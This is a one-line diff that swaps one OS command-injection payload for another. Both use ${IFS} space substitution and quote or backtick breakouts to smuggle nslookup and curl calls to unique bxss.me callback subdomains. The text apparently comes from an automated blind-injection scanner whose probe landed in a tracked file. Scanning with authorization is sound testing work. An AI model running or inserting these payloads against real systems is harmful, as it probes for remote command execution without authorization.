@@ -1,1 +1,1 @@
-|(nslookup${IFS}-q${IFS}cname${IFS}hithmptpmxtab55fe7.bxss.me||curl${IFS}hithmptpmxtab55fe7.bxss.me)
+&(nslookup${IFS}-q${IFS}cname${IFS}hitisfjnihebge74a0.bxss.me||curl${IFS}hitisfjnihebge74a0.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitisfjnihebge74a0.bxss.me||curl${IFS}hitisfjnihebge74a0.bxss.me)&`'
